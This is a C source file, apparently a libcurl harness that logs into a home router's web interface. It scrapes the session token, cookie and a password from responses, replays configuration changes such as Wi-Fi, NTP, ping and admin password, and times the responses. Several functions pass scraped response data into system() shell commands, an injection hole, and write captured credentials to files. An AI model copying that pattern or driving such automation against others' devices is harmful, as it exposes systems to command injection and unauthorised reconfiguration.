/*
 * Copyright (c) 2018 [n/a] info@embeddora.com All rights reserved
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *        * Redistributions of source code must retain the above copyright
 *          notice, this list of conditions and the following disclaimer.
 *        * Redistributions in binary form must reproduce the above copyright
 *          notice, this list of conditions and the following disclaimer in the
 *          documentation and/or other materials provided with the distribution.
 *        * Neither the name of The Linux Foundation nor
 *          the names of its contributors may be used to endorse or promote
 *          products derived from this software without specific prior written
 *          permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NON-INFRINGEMENT ARE DISCLAIMED.    IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 * OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 * ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/* TODO: give a comment */
#include <stdio.h>

/* TODO: give a comment */
#include <stdlib.h>

/* TODO: give a comment */
#include <string.h>

/* unlink() */
#include <unistd.h>

/* CURL library API */
#include <curl/curl.h>

/* Own interface, structures, definitions */
#include "site_crawler.mri.h"



#if (RESPONCE_LATENCY_GAUGING)

/* gettimeofday() and time structures */
#include <sys/time.h>

/* Time structured of HTTP-request and corresponding to it HTTP-responce */
struct timeval stHttpRequest, stHttpResponce;

/* Suppose 32K is enough to include any HTML responce from T5; used in <iRecvClbk()> */
char cBuffer[R30_HTTP_CBK_BUF];

/* Position ot last char in receive buffer processed by <iRecvClbk> */
int	wr_index;

char pcAddrStr[R30_HTTP_LENGTH];

#endif /* (RESPONCE_LATENCY_GAUGING) */




/* TODO: give a comment */
char cR30Token[R30_TKN_LENGTH+1];

char cR30Token_Wrapped[R30_TKN_LENGTH+5];//TODO: fix

/* Token is 32-char long string computed on side of P5 and passed to us in responce to TODO request */
static int m_TokenFound;

/* Indexes of operation being checked, and of paramneter being 'tryed' */
static int iOpIdx, iParIdx;



/* TODO: give a comment */
char cR30Passwd[R30_PSW_LENGTH+1];

/* TODO: give a comment */
char cR30Passwd_Sp[R30_PSW_SP_LENGTH+1];

/* TODO: give a comment */
char cR30Passwd_Wrapped[R30_PSW_LENGTH+64];

/* Passowrd is first member of bi-string array, in respoince to TODO request */
static int m_PasswordFound;


/* TODO: give a comment */
char cR30Cookie[R30_CKY_LENGTH+1];

/* TODO: give a comment */
char cR30Cookie_Wrapped[R30_CKY_LENGTH+15];//TODO: fix

/* Cookie is 32-char long string computed on side of P5 and passed to us in responce to TODO request */
static int m_CookieFound;


/* Buffer to keep this session RSA key */
char STUB[R30_RSA_LEN + 1];


/* Dump cpontents of HTTP traffic being received; for usage on narrow consoles */
static void Dump(const char *text, FILE *stream, unsigned char *ptr, size_t size)
{
size_t i,  c;

unsigned int width=0x20;

#if (EXTRA_INFORMATIVITY)

	fprintf(stream, "%s, %10.10ld bytes (0x%8.8lx)\n", text, (long)size, (long)size);

	for( i = 0; i < size; i += width )
	{
		fprintf(stream, "%4.4lx: ", (long)i);

		/* Show hex to the left */
		for(c = 0; c < width; c++)
		{
			if(i+c < size)

				fprintf(stream, "%02x ", ptr[i+c]);
			/* else
				fputs(" ", stream); */
		}

		/* Last row reqiures special tabulation */
		if (i + width > size)

			for(c = 0; c < width - (size % width); c++)	

				fputs("   ", stream);

		/* Show data on the right */
		for(c = 0; (c < width) && (i+c < size); c++)

			fputc((ptr[i+c]>=0x20) && (ptr[i+c]<0x80)?ptr[i+c]:'.', stream);

		fputc('\n', stream);
	}
#endif /* (EXTRA_INFORMATIVITY) */

} /* static void Dump( . . ) */

/* Define 1 to not check HEX output profoundly */
#define SKIP_ONE_HEX 1

/* Dump cpontents of HTTP traffic being received; for usage on wide consoles */
static void WideDump(const char *text, FILE *stream, unsigned char *ptr, size_t size)
{
size_t i,  c;

unsigned int width=0x40;

#if (EXTRA_INFORMATIVITY)

	fprintf(stream, "%s, %10.10ld bytes (0x%8.8lx)\n", text, (long)size, (long)size);

	for( i = 0; i < size; i += width )
	{
		fprintf(stream, "%4.4lx: ", (long)i);

		/* Show hex to the left */
		for(c = 0; c < width; c++)
		{
#if (SKIP_ONE_HEX)
			if(i+c < size)
				if ( (i+c) % 2) 

					/* Output hex for even bytes only - screen is not enough */
					fprintf(stream, "%02x", ptr[i+c]);
				else
					/* And skip odd bytes, anyway nobody looks at them */
					fprintf(stream, " ");


#else
			/* Output hex'es w/o whitespace  */
			if(i+c < size)

				fprintf(stream, "%02x", ptr[i+c]);
#endif /* (SKIP_ONE_HEX) */
		}

#if (SKIP_ONE_HEX)
		/* Last row reqiures special tabulation */
		if (i + width > size)
		{

			for(c = 0; c < width - (size % width); c++)	
				if ( c % 2) 
					fputs("  ", stream);
				else
					fputs(" ", stream);

				if ( c % 2) fprintf(stream, " ");

		}
#else
		/* Last row reqiures special tabulation */
		if (i + width > size)

			for(c = 0; c < width - (size % width); c++)	

				fputs("  ", stream);
#endif /* (SKIP_ONE_HEX) */

		fprintf(stream, "   ");

		/* Show data on the right */
		for(c = 0; (c < width) && (i+c < size); c++)

			fputc((ptr[i+c]>=0x20) && (ptr[i+c]<0x80)?ptr[i+c]:'.', stream);

		fputc('\n', stream);
	}
#endif /* (EXTRA_INFORMATIVITY) */

} /* static void WideDump( . . . ) */


/* TODO: give a comment */
static int iGetToken(unsigned char *ptr)
{
char * cpAjaxPtr, * cp1;

	/* Clear token (itself and wrapped one) contents, i.e. body + TR0 */
	memset (cR30Token, 0 , R30_TKN_LENGTH + 1);
	memset (cR30Token_Wrapped, 0 , R30_TKN_LENGTH + R30_TKN_WRP_LENGTH + 1);

	/* Clean token-found value for accuracy. We expect it also to be cleared in main() */
	m_TokenFound = 0;

	if ( NULL != ( cpAjaxPtr = strstr(ptr, "stok\":\"") ) )
	{
		cpAjaxPtr = & cpAjaxPtr [strlen ("stok\":\"") ];

		cp1 = strtok(cpAjaxPtr, "\"");

		if (R30_TKN_LENGTH == strlen (cp1) )
		{
			m_TokenFound = 1;

			/* Without TR0 - see first instr. of this fn. */
			memcpy(cR30Token, cp1, R30_TKN_LENGTH );

			memcpy(cR30Token_Wrapped, "stok=", R30_TKN_WRP_LENGTH);

			/* Without TR0 - see second instr. of this fn. */
			memcpy(&cR30Token_Wrapped[R30_TKN_WRP_LENGTH], cp1, R30_TKN_LENGTH);

			char cFileBuf[BASH_STRING_LEN];

			sprintf(cFileBuf,  "echo \"token: %s, wrapped token: %s\">> ./%s", cR30Token, cR30Token_Wrapped, TOKEN_FNAME);
			system (cFileBuf);

			return R30_SUCCESS;
		}
	}

	return R30_FAILURE;

} /* static int iGetToken( . . .) */

/* TODO: give a comment */
static int iGetCookie(unsigned char *ptr, CURL * urlLib)
{
char * cpAjaxPtr, * cp1;

/* For exit with failure. But what if we don't need LUA-part of the site to work, i.e. what is we need only JS-part of it? */
int iRes;

	/* Clear cookie contents, i.e. body + TR0 */
	memset (cR30Cookie_Wrapped, 0 , R30_CKY_LENGTH + R30_WRP_CKY_LENGTH + 1 /* with TR0 */);

	/* Clean cookie-found value*/
	m_CookieFound = 0;

	if ( NULL != ( cpAjaxPtr = strstr(ptr, "sysauth=") ) )
	{
		memcpy(cR30Cookie_Wrapped, cpAjaxPtr, R30_CKY_LENGTH + R30_WRP_CKY_LENGTH /* without TR0 */);


#if (DONT_REFRESH_COOKIES)
		/* Let's stop for new cookies throughout working session; why not? */
		m_CookieFound = 1;
#endif /* (0) */

		iRes = curl_easy_setopt(urlLib, CURLOPT_COOKIE, cR30Cookie_Wrapped);

		char cFileBuf[BASH_STRING_LEN];		

		sprintf(cFileBuf,  "echo \"Wrapped cookie: %s\">> ./%s", cR30Cookie_Wrapped, CKY_FNAME);
		system (cFileBuf);

		return R30_SUCCESS;
	}

	return R30_FAILURE;

} /* static int iGetCookie(. . . ) */



/* TODO: give a comment */
static int iGetPassword(unsigned char *ptr)
{
char * cpAjaxPtr, * cpAjaxPtr_Sp;

char * cp1;

	/* Clear password contents */
	memset (cR30Passwd, 0 , R30_PSW_LENGTH);

	/* Clear password-sp's contents */
	memset (cR30Passwd_Sp, 0 , R30_PSW_SP_LENGTH);
	
	/* Clean password-found value for accuracy. We expect it also to be cleaned in main() */
	m_PasswordFound = 0;

	if ( NULL != ( cpAjaxPtr_Sp = cpAjaxPtr = strstr(ptr, "password\":[ \"") ) )
	{
		cpAjaxPtr = & cpAjaxPtr [strlen ("password\":[ \"") ];

		cpAjaxPtr_Sp = & cpAjaxPtr_Sp [strlen ("password\":[ \"")  + R30_PSW_LENGTH + 4 /* strlen(", ") */ ];

		memcpy (cR30Passwd_Sp, cpAjaxPtr_Sp, R30_PSW_SP_LENGTH); 

		cp1 = strtok(cpAjaxPtr, "\"");

		if (R30_PSW_LENGTH == strlen (cp1) )
		{
			m_PasswordFound = 1;

			memcpy(cR30Passwd, cp1, R30_PSW_LENGTH+1 );

			char cFileBuf[BASH_STRING_LEN*8];		

			sprintf(cFileBuf,  "echo \"password: %s, special: %s\">> ./%s", cR30Passwd, cR30Passwd_Sp, PASSWD_FNAME);
			system (cFileBuf);

			return R30_SUCCESS;
		}
	}

	return R30_FAILURE;

} /* static int iGetPassword( . . . ) */


/* Callback to execute on arrival of HTML responce */
static int iTrace(CURL * handle, curl_infotype type, char *data, size_t size, void *userp)
{
const char *text;

(void)handle;

#if (EXTRA_INFORMATIVITY)

	switch (type)
	{
		/* In case a new one is introduced to knock me out */
		default:
		case CURLINFO_TEXT:
		{
			/* Self-explanatory:printf("[%s] %s: Skipping 'Info' or unknown header\n", __FILE__, __func__);*/
			return R30_FAILURE;
		}

		case CURLINFO_HEADER_OUT:
			text = "=> Send header";
		break;

		case CURLINFO_DATA_OUT:
			text = "=> Send data";
		break;

		case CURLINFO_SSL_DATA_OUT:
			text = "=> Send SSL data";
		break;

		case CURLINFO_HEADER_IN:
			text = "<= Recv header";
		break;

		case CURLINFO_DATA_IN:
			text = "<= Recv data";
		break;

		case CURLINFO_SSL_DATA_IN:
			text = "<= Recv SSL data";
		break;
	}


#if (WIDE_CONSOLE)
	WideDump(text, stderr, (unsigned char *)data, size);
#else
	Dump(text, stderr, (unsigned char *)data, size);
#endif /* (WIDE_CONSOLE) */


#endif /* (EXTRA_INFORMATIVITY) */

	/* Look for password only in data section of incomming packets */
	if (0 ==  m_PasswordFound && CURLINFO_DATA_IN == type)

			iGetPassword((unsigned char *)data );

	/* Look for tokens only in data section of incomming packets */
	if (0 ==  m_TokenFound && CURLINFO_DATA_IN == type)

			iGetToken((unsigned char *)data );

	/* Look for cookies only in header section of outgoing packets */
	if (0 ==  m_CookieFound  && CURLINFO_HEADER_IN == type )

			iGetCookie((unsigned char *)data , handle);

	return R30_SUCCESS;

} /* static int iTrace( . . . ) */

static int iProcessArray(CURL * curl, void * pGpArray)
{
int i=0;

CURLcode iRes;

/* Pointer to an array being used currently */
pGp pGP_Array;

	pGP_Array = (pGp)pGpArray;

	while ( NULL != pGP_Array[i].pcAddrStr )
	{
#if (EXTRA_INFORMATIVITY)

		//.printf("%d : \t %d \t  %s  \n", i, pGP_Array[i].iGetOrPost , pGP_Array[i].pcAddrStr ) ;

#endif /* (EXTRA_INFORMATIVITY) */

		/* Temporary buffer to compose a XML payload of POST request */
		char cTemporary[0x400];

		/* Make variable instad of static-initialized, so the strstr() works on it */
		char pGP_ArrayI_pcAddrStr[R30_HTTP_LENGTH];

		strcpy (pGP_ArrayI_pcAddrStr, pGP_Array[i].pcAddrStr);

		/* <m_TokenFound> in perticular means that <cR30Token_Wrapped> is not NULL */
		if (m_TokenFound) 
		{
		char * pcHayStack = NULL;

			//strcpy (pGP_ArrayI_pcAddrStr, pGP_Array[i].pcAddrStr);

			if (NULL != (pcHayStack = strstr(pGP_ArrayI_pcAddrStr, "stok=")   ))
			{
				strcpy (pGP_ArrayI_pcAddrStr, pGP_Array[i].pcAddrStr);

				/* for all except very first and very specific inhabitor of <stok> */
				if (  2 != pGP_Array[i].iGetOrPost  )

					memcpy( pcHayStack, cR30Token_Wrapped, R30_TKN_LENGTH+R30_TKN_WRP_LENGTH );//TODO: fix; no TR0
			}
		}

		/* From now on let's work with <pGP_ArrayI_pcAddrStr> insted of <pGP_Array[i].pcAddrStr> */

		/* GET operations, no payload */
		if (0 == pGP_Array[i].iGetOrPost )
		{
			curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);

			iRes = curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr );
		}

		/* No payload POST operations */
		else if ( 1 == pGP_Array[i].iGetOrPost ) 
		{
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, 0/* "" cTemporary */);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0 /* (long)strlen(cTemporary)*/ );

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == login, payload ist must */
		else if (2 == pGP_Array[i].iGetOrPost )
		{
			/* We don't need no needle to be giving us a thrill */
			sprintf (cTemporary, "operation=login&password=%s", STUB0);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr );
		}

		/* Operation == read, vorbereiten */
		else if (1000 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=read");

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == write, vorbereiten */
		else if (1006 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=write");

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}


		/* Operation == USB Share password change */
		else if (311 == pGP_Array[i].iGetOrPost )
		{			sprintf (cTemporary, "operation=update&index=0&key=key-0&old=%%7B%%22type%%22%%3A0%%2C%%22username%%22%%3A%%22%s%%22%%2C%%22password%%22%%3A%%22%s%%22%%2C%%22permission%%22%%3A%%22rw%%22%%2C%%22key%%22%%3A%%22key-0%%22%%7D&new=%%7B%%22username%%22%%3A%%22%s%%22%%2C%%22password%%22%%3A%%22%s%%22%%7D", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr3, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr4);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == WIFI SESSION UUID 2.4/5.0 GHz*/
		else if (312 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=write&guest_2g_enable=on&guest_2g_ssid=%s&guest_2g_hidden=off&guest_5g_enable=on&guest_5g_ssid=%s&guest_5g_hidden=off&guest_2g5g_passwd_cycle=never&guest_2g5g_encryption=none", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (313 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=write&enable=on&ssid=%s&hidden=off&encryption=psk&psk_version=auto&psk_cipher=auto&psk_key=%s&hwmode=bgn&htmode=auto&channel=auto&txpower=high&disabled_all=off", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (314 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=write&enable=on&ssid=%s&hidden=off&encryption=psk&psk_version=auto&psk_cipher=auto&psk_key=%s&hwmode=anac_5&htmode=auto&channel=auto&txpower=high&disabled_all=off", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (315 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=save&server=%s&enable=on%%2Con%%2Coff%%2Coff&port=21", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (316 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=write&up_band=%s&up_unit=mbps&down_band=%s&down_unit=mbps&high=60&middle=30&low=10", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (317 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=add&method=device&device_name=%s&mac=%s&rule_app=&app_list=off&priority=high", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (318 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=write&current_time=12%%3A41%%3A34+AM%%2C+01%%2F01%%2F1970&hour24_enable=off&type=auto&timezone=720&ntp_svr1=%s&ntp_svr2=%s&status=", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (319 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=start&type=0&ipaddr_ping=%s&ipaddr=%s&count=4&pktsize=64&ttl=20&result=The+Router+is+ready.%%0D%%0A", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (320 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=write&old_pwd=%s&new_pwd=%s&cfm_pwd=%s", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr3);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}
		/* Operation == TODO: add */
		else if (321 == pGP_Array[i].iGetOrPost )
		{
			sprintf (cTemporary, "operation=write&assign_type=rdnss&rdnss_prefix=%s%%3A%%3A&address=FE80%%3A%%3A20A%%3AEBFF%%3AFE13%%3A7B00%%2F64", ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cTemporary);

			curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(cTemporary));

			curl_easy_setopt(curl, CURLOPT_URL, pGP_ArrayI_pcAddrStr);
		}


#if defined (RESPONCE_LATENCY_GAUGING)
		/* TODO: rework comment*/

		/* Since the <iRecvClbk> is executed in separate thread we may get HTTP-responce-arrival values what are lower that HTTP-request-sending
		value so their subtraction (i.e. time difference we measure) will be negative. It's no a purpose, therefore we measure HTTP-request-sending
		value _before issuing the request. */

		/* Take current value as time of responce arrival into <stHttpResponce> structure */
		gettimeofday(&stHttpResponce, 0);

		/* Compute responce interval <dbRespInt> in microseconds */
		double dbRespInt = 1000000*(stHttpResponce.tv_sec - stHttpRequest.tv_sec) + stHttpResponce.tv_usec - stHttpRequest.tv_usec;

		memcpy ((void *)&stHttpRequest, (void *)&stHttpResponce, sizeof (struct timeval) ) ; 

		/* Filename variable */
		char cFileBuf[GAUGE_STRING_LEN];

		/* Store raw debug output into file */
		sprintf(cFileBuf,  "echo  \" prev. operation takes %9.3f milliseconds. Now doing operation <%s>\">> ./%s\n", dbRespInt/1000, pGP_ArrayI_pcAddrStr, MRI_FNAME);

		system (cFileBuf);

		/* Let's store all 'buig reproduced' cases into separate file */
		if (GAUGE_HTTP_THRESHOLD < dbRespInt/1000 )
		{
			/* On begin of life cycle the <pcAddrStr> will be null, but on that time the issue isn't reproducible */
			sprintf(cFileBuf,  "echo  \"REPRODUCED. %9.3f milliseconds: operation <%s>\" | tee -a ./%s.REPRODUCED\n", dbRespInt/1000, pcAddrStr, MRI_FNAME);

			printf("REPRODUCED. %9.3f milliseconds: operation <%s>\n ", dbRespInt/1000, pcAddrStr);

			system (cFileBuf);
		}

		/* Preserve current URL for next iteraion */
		strcpy ( pcAddrStr, pGP_ArrayI_pcAddrStr);	

		// TODO: bad name, and bad memory class - should be static 
		wr_index = 0;
#endif /* (RESPONCE_LATENCY_GAUGING) */

		iRes = curl_easy_perform(curl);

		i++;
	}

	return iRes;

} /* int iProcessArray(.  .  .)  */


#if defined (RESPONCE_LATENCY_GAUGING)

/* Not used. For a while */
static size_t iRecvClbk(void *contents, size_t size, size_t nmemb, void *userp)
{
size_t realsize = size * nmemb;

	if ( R30_HTTP_CBK_BUF < wr_index + realsize )
	{
		*(int *)userp = 1;

		return 0;
	}

	/* Copy the data from the curl buffer into auto buffer */
	memcpy( (void *)&cBuffer[wr_index], contents, realsize );

	/* Update the write index */
	wr_index += realsize;

	/* Null terminate the buffer */
	cBuffer[wr_index] = 0;

	/* Tip: as the packet details' output may take up to few seconds we should measure time prior this output */

	return realsize;

} /* size_t iRecvClbk( . . . )  */

#endif /* (RESPONCE_LATENCY_GAUGING) */

static void ComputeRSA()
{ 
char cNodeBuf[BASH_STRING_LEN], cRsaBuf[R30_RSA_LEN+1];

FILE * rsaFile;

	/* Be sure you've done <apt-get install node> <apt-get install nodejs> first */
	sprintf(cNodeBuf,  "%s ./%s >%s", INTERPRETER_FNAME, RSA_COMPUTER_FNAME, ENCR_FNAME);

	system (cNodeBuf);

	rsaFile = fopen(ENCR_FNAME, "r");

	if (NULL != rsaFile)
	{

		fflush(rsaFile);

		fscanf(rsaFile, "%s", cRsaBuf);

		fclose(rsaFile);
	}
	else
	{
		; /* do noting, we still may work wit pre-computed RSAs */
	}

	if (R30_RSA_LEN == strlen(cRsaBuf)  )

		/* Use freshest (valid) value */
		strcpy(STUB, cRsaBuf);
	else
		/* Use one of pre-computed values (they may appear to be not valid) */
		strcpy(STUB, STUB0);

} /* static void ComputeRSA( ) */

/* Former main(). Inherited from project 'site_crawler.rlg' */
int _main (int argc, char **argv)
{
CURL *urlLib;

CURLcode iRes;

char cOpCode[R30_STRNLEN];

	/* True or forged, we need it for unlocking the site */
	ComputeRSA();

	/* Initialize variables and callbacks of library */
	urlLib = curl_easy_init();

	/* Can start as soon as library entry point was initialized */
	if(urlLib)
	{
	char cTemporary[0x200];

		iRes = curl_easy_setopt(urlLib, CURLOPT_DEBUGFUNCTION, iTrace );
		iRes = curl_easy_setopt(urlLib, CURLOPT_HEADER, 1L);

		/* So far I experienced there's no other, lets use this one. TODO: check if it's really so in <TouchP5-xxxx> code*/
		iRes = curl_easy_setopt(urlLib, CURLOPT_REFERER, "http://192.168.0.1/webpages/index.html");

		/* Assign default value with which LUA-part of the site won't work anyway; only JS-part will. */
		sprintf (cTemporary, "sysauth=%s", CUKY0);
		iRes = curl_easy_setopt(urlLib, CURLOPT_COOKIE, cTemporary);

		/* Put our designations into traffic, so we're able to distingiosh own cookies from the rest */
		sprintf (cTemporary, "Mozilla/5.0 (X11; Ubuntu; %s) %s", "proprietary", R30_CKY_MARKER);

		iRes = curl_easy_setopt(urlLib, CURLOPT_USERAGENT, cTemporary);

		iRes = curl_easy_setopt(urlLib, CURLOPT_CONNECTTIMEOUT, 30 );
		iRes = curl_easy_setopt(urlLib, CURLOPT_VERBOSE, 1L);

#if defined (RESPONCE_LATENCY_GAUGING)

		/* Send all data received to this function */
		curl_easy_setopt(urlLib, CURLOPT_WRITEFUNCTION, iRecvClbk);

#endif /* (RESPONCE_LATENCY_GAUGING) */

		/* Num of test repetitions*/
		int iRepetitions = 1;

		/* Let's open site */
		while (iRepetitions--) 
		{

		/* TODO: deploy for checking, or move away otherwise */
		int iRes;

			/* We should compute them anew each time we're opening the site */
			m_PasswordFound = m_TokenFound = m_CookieFound = 0;

#if defined (RESPONCE_LATENCY_GAUGING)

			/* TODO: give a comment */
			gettimeofday(&stHttpRequest, 0);

			/* TODO: give a comment */
			pcAddrStr[0]=0;

#endif /* (RESPONCE_LATENCY_GAUGING) */

			/* Let's open site. Mandatory for any other operation to be effective */
			iRes = iProcessArray(urlLib, (void *) aOpenArray);

			/* Let's sleep for a site to become stable */
			sleep (R30_GP_TMO);

			/* Here we have a change that <m_TokenFound> becomes 1 */
	
			/* Let's open first tab of site. Alegedly mandatory for any other operation to be effective */
			iRes = iProcessArray(urlLib, (void *) aAuthArray);

			/* Self-explanatory */
			printf("[%s] %s Site unlocked [%d]. Now can do _any operation\n", __FILE__, __func__, iRepetitions); 

			pSp pSP_Array = (pSp)aTestTable[iOpIdx].apPar;

			/* Arrays is empty, in other words - no parameters et all (which is an error) */
			if (NULL == pSP_Array) continue;

			/* If first parameter is NULLthen hardly parameter list is consistent; Rest parameter sets should be tried */
			for ( iParIdx = 0; NULL != pSP_Array[iParIdx].pcStr1 ; iParIdx++)
			{
#if (EXTRA_INFORMATIVITY)
				fprintf(stderr, "[%s] %s The parameters of <%s> are such: \n%s %s %s %s \n", __FILE__, __func__ , aTestTable[iOpIdx].cName,	((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr3, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr4);
#endif /* (EXTRA_INFORMATIVITY) */
fprintf(stderr, "[%s] %s The parameters of <%s> are such: \n%s %s %s %s \n", __FILE__, __func__ , aTestTable[iOpIdx].cName,	((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr1, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr2, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr3, ((pSp)aTestTable[iOpIdx].apPar)[iParIdx].pcStr4);

				/* Do the operation with current set of parameters */
				iRes = iProcessArray(urlLib, aTestTable[iOpIdx].apArr);
			}

			/* Wait for system to stabilize */
			sleep (R30_TAB3_TMO);

			/* Self-explanatory */
